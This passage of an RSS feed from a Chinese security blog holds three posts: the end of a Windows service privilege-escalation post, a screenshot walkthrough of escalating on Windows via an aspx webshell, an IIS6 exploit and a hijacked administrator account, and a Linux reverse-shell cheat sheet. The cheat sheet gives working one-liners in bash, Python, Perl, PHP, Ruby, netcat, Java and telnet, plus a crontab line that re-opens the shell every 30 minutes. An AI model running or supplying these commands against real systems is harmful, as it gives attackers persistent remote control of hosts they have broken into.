  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_shell_add_user_to_administrators.png&#34; alt=&#34;Windows下第三方服务提权-通过shell函数添加用户到管理员组&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_shell_active_user.png&#34; alt=&#34;Windows下第三方服务提权-通过shell函数激活用户&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_shell_view_user.png&#34; alt=&#34;Windows下第三方服务提权-通过shell函数查看用户&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;远程连接-1:8630331b284514675820d26a98874acc&#34;&gt;远程连接&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_shell_remote_connection.png&#34; alt=&#34;Windows下第三方服务提权-远程3389连接&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Windows下系统漏洞提权</title>
      <link>http://wyb0.com/posts/windows-use-system-vulnerabilities-elevate-privileges/</link>
      <pubDate>Sun, 07 Aug 2016 21:31:35 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/windows-use-system-vulnerabilities-elevate-privileges/</guid>
      <description>

&lt;p&gt;提权是在已经getshell但是权限不大的前提下做的&lt;/p&gt;

&lt;h3 id=&#34;0x00-查看基本信息:086da663ba7aab309c2abc245def2b44&#34;&gt;0x00 查看基本信息&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_msg1.png&#34; alt=&#34;Windows系统漏洞提权-查看基本信息1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_msg2.png&#34; alt=&#34;Windows系统漏洞提权-查看基本信息2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-使用cmd执行命令:086da663ba7aab309c2abc245def2b44&#34;&gt;0x01 使用cmd执行命令&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;尝试使用cmd执行命令

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_try_use_cmd.png&#34; alt=&#34;Windows系统漏洞提权-尝试使用cmd执行命令&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;找可写目录

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_find_wirteable_dir.png&#34; alt=&#34;Windows系统漏洞提权-找可写目录&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;尝试上传cmd.exe

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_try_upload_cmd.png&#34; alt=&#34;Windows系统漏洞提权-尝试上传cmd&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;写一个aspx马

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_write_aspx.png&#34; alt=&#34;Windows系统漏洞提权-写一个aspx马&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_aspx.png&#34; alt=&#34;Windows系统漏洞提权-查看aspx马&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;上传cmd.exe

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_upload_cmd.png&#34; alt=&#34;Windows系统漏洞提权-上传cmd&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_cmd.png&#34; alt=&#34;Windows系统漏洞提权-查看上传的cmd&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;再次尝试使用cmd执行命令

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_try_use_cmd_again1.png&#34; alt=&#34;Windows系统漏洞提权-再次尝试使用cmd执行命令1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_try_use_cmd_again2.png&#34; alt=&#34;Windows系统漏洞提权-再次尝试使用cmd执行命令2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-权限提升:086da663ba7aab309c2abc245def2b44&#34;&gt;0x02 权限提升&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;查看未安装补丁

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_patch.png&#34; alt=&#34;Windows系统漏洞提权-查看系统未安装补丁&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;上传exp提权

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_upload_iis6.png&#34; alt=&#34;Windows系统漏洞提权-上传iis6&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_run_iis6_1.png&#34; alt=&#34;Windows系统漏洞提权-第一次运行iis6&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_run_iis6_2.png&#34; alt=&#34;Windows系统漏洞提权-再次运行iis6&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x03-添加用户:086da663ba7aab309c2abc245def2b44&#34;&gt;0x03 添加用户&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;添加远程连接用户

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_use_sys_help_user.png&#34; alt=&#34;Windows系统漏洞提权-使用系统自带的帮助用户&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_sys_help_user_add_pwd.png&#34; alt=&#34;Windows系统漏洞提权-为系统自带的帮助用户添加密码&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_sys_help_user_add_administrators.png&#34; alt=&#34;Windows系统漏洞提权-将系统自带的帮助用户添加到管理员组&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_active_sys_help_user.png&#34; alt=&#34;Windows系统漏洞提权-启用系统自带的帮助用户&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_sys_help_user.png&#34; alt=&#34;Windows系统漏洞提权-查看系统自带的帮助用户现在的权限信息&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x04-使用3389远程连接:086da663ba7aab309c2abc245def2b44&#34;&gt;0x04 使用3389远程连接&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_ip.png&#34; alt=&#34;Windows系统漏洞提权-查看ip信息&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_remote_connection.png&#34; alt=&#34;Windows系统漏洞提权-远程连接&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_remote_connection_input_pwd.png&#34; alt=&#34;Windows系统漏洞提权-远程连接输入用户名密码&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_remote_connection_success.png&#34; alt=&#34;Windows系统漏洞提权-远程连接成功&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Linux下反弹shell</title>
      <link>http://wyb0.com/posts/linux-bounce-shell/</link>
      <pubDate>Sat, 06 Aug 2016 08:36:53 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-bounce-shell/</guid>
      <description>

&lt;p&gt;当你找到一个有命令执行的主机时，你可能想要一个交互式deshell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令&lt;/p&gt;

&lt;h3 id=&#34;0x00-bash:cb5bc3bfec7e0741b65e9670a9257e5b&#34;&gt;0x00 Bash&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/8888 0&amp;gt;&amp;amp;1
注：这个由解析shell的bash完成，有些时候不支持
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x01-crontab:cb5bc3bfec7e0741b65e9670a9257e5b&#34;&gt;0x01 crontab&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;下面这条命令执行后会每隔30分钟反弹一次：
(crontab -l;printf &amp;quot;*/30 * * * * exec 9&amp;lt;&amp;gt; /dev/tcp/10.10.10.10/8888;exec 0&amp;lt;&amp;amp;9;
exec 1&amp;gt;&amp;amp;9 2&amp;gt;&amp;amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&amp;quot;)|
crontab -
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x02-python:cb5bc3bfec7e0741b65e9670a9257e5b&#34;&gt;0x02 Python&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# 下面为1条命令
python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,
socket.SOCK_STREAM);s.connect((&amp;quot;10.10.10.10&amp;quot;,8888));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x03-perl:cb5bc3bfec7e0741b65e9670a9257e5b&#34;&gt;0x03 Perl&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;# 下面为1条命令
perl -e &#39;use Socket;$i=&amp;quot;10.10.10.10&amp;quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,
getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,
&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x04-php:cb5bc3bfec7e0741b65e9670a9257e5b&#34;&gt;0x04 PHP&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;php -r &#39;$sock=fsockopen(&amp;quot;10.10.10.10&amp;quot;,8888);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x05-ruby:cb5bc3bfec7e0741b65e9670a9257e5b&#34;&gt;0x05 Ruby&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;# 下面为1条命令
ruby -rsocket -e&#39;f=TCPSocket.open(&amp;quot;10.10.10.10&amp;quot;,8888).to_i;
exec sprintf(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;quot;,f,f,f)&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x06-netcat:cb5bc3bfec7e0741b65e9670a9257e5b&#34;&gt;0x06 Netcat&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;nc -e /bin/sh 10.10.10.10 8888
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x07-java:cb5bc3bfec7e0741b65e9670a9257e5b&#34;&gt;0x07 Java&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;# 下面为3条命令
r = Runtime.getRuntime()
p = r.exec([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;exec 5&amp;lt;&amp;gt;/dev/tcp/10.10.10.10/8888;cat &amp;lt;&amp;amp;5 | 
while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;quot;] as String[])
p.waitFor()
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x08-telnet:cb5bc3bfec7e0741b65e9670a9257e5b&#34;&gt;0x08 telnet&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;两种方法：
mknod backpipe p &amp;amp;&amp;amp; telnet 173.214.173.151 8080 0backpipe
telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888
第一种hacker运行：nc -vlp 8080
第二种hacker运行：nc -vlp 8080和nc -vlp 8888
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
参考文章：&lt;br /&gt;
&lt;a href=&#34;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&#34;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;https://www.91ri.org/6620.html&#34;&gt;https://www.91ri.org/6620.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>